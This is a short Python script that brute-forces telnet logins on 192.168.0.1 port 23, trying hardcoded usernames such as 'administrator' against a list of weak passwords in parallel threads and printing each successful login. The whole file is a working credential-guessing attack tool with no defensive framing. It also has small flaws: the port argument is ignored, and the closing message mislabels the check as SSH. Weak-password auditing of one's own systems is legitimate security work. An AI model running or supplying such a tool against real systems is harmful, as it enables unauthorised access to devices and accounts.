#! /usr/bin/env python
# _*_  coding:utf-8 _*_

import telnetlib
import time
import threadpool
from threading import *

screenLock = Semaphore(value=2)
start_time = time.time()


def telnet_login(ip, port, user, pwd):
    try:
        screenLock.acquire()
        tn = telnetlib.Telnet(ip, timeout=5)
        tn.set_debuglevel(0)
        tn.read_until("login: ")
        tn.write(user + '\r\n')
        tn.read_until("assword: ")
        tn.write(pwd + '\r\n')
        result = tn.read_some()
        result = result + tn.read_some()

        if result.find('Login Fail') > 0 or result.find('incorrect') > 0:

            print("[-] Checking for " + user, pwd + " fail")

        else:
            print("[+] Success login for " + user, pwd)

        tn.close()
        screenLock.release()
    except:
        print('[-] Something Error ' + user, pwd + " fail")

    finally:
        pass


def getuserdic(ip, port):
    username_list = ['xiaozi', 'administrator']
    password_list = ['root', '', 'abc123!', '123456', 'password', 'root']
    userlist = []
    for username in username_list:
        user = username.rstrip()
        for password in password_list:
            pwd = password.rstrip()
            userdic = {}
            userdic['ip'] = ip
            userdic['port'] = port
            userdic['user'] = user
            userdic['pwd'] = pwd
            tmp = (None, userdic)
            userlist.append(tmp)
    return userlist


def telnet(ip, port):
    userlist = getuserdic(ip, port)
    pool = threadpool.ThreadPool(10)
    requests = threadpool.makeRequests(telnet_login, userlist)
    [pool.putRequest(req) for req in requests]
    pool.wait()


if __name__ == '__main__':
    start_time = time.time()
    telnet('192.168.0.1', 23)
    print('Checking for SSH weak password:%d' % (time.time() - start_time))